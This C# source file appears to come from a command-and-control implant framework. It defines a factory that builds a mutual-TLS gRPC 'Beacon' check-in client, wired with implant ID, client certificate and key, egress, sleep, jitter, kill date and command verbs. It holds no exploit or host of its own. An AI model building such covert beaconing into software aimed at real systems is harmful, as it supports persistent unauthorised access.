namespace Rod.Implant.Internal;

// The mTLS stream transport module (architecture.md Sec 8): the long-lived
// gRPC Beacon.CheckIn client and its factory. A whole source-file module --
// the build unit drops this file and Beacon.cs from the compilation of a
// web-shaped build (and switches the proto generation to message types
// only), so the artifact ships no gRPC client it can never dial.

/// <summary>
/// Builds the mTLS gRPC stream client off the shared setup. The stream
/// consumes the check-in mode (stream vs poll) and the private key half of
/// the enrollment -- the leaf plus key present as the TLS client certificate
/// -- and shares the replay-nonce floor with any other client covering the
/// same run.
/// </summary>
internal static class StreamCheckIn
{
    public static ICheckInClient Create(CheckInSetup setup) => new Beacon(
        setup.Config.Mode,
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.Leaf,
        setup.Enrollment.PrivateKey,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Config.ClassVerbs,
        setup.Log,
        setup.Nonces,
        setup.Cadence,
        setup.Held);
}
